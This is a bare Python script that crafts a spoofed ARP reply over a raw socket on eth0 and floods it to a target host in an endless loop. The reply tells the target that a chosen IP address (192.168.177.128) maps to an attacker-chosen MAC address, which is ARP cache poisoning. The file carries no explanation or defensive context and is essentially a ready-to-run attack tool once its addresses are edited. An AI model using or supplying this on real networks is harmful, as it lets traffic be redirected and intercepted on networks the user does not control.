import socket
import struct
import binascii

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

updater = '\x00\x0c\x29\x7f\x21\x9d' # THIS HOST
updated = '\x00\x50\x56\xc0\x00\x08' # HOST TO UPDATE
advertised = '\x00\x11\x22\x33\x44\x55' # HOST TO ADVERTISE

ether_type = '\x08\x06' # ARP

updated_header = updated + updater + ether_type

hardware_type = '\x00\x01' # ETHERNET
protocol_type = '\x08\x00' # IP
hardware_size = '\x06'
protocol_size = '\x04'
opcode = '\x00\x02' # ARP REPLY    00 01 is ARP REQUEST

advertised_ip = '192.168.177.128' # HOST TO ADVERTISE
updated_ip = '192.168.177.1' # HOST TO UPDATE

advertised_hex_ip = socket.inet_aton ( advertised_ip )
updated_hex_ip = socket.inet_aton ( updated_ip )

arp_updated = updated_header + hardware_type + protocol_type + hardware_size + protocol_size + opcode + advertised + advertised_hex_ip + updated + updated_hex_ip

while 1:
  s.send(arp_updated)

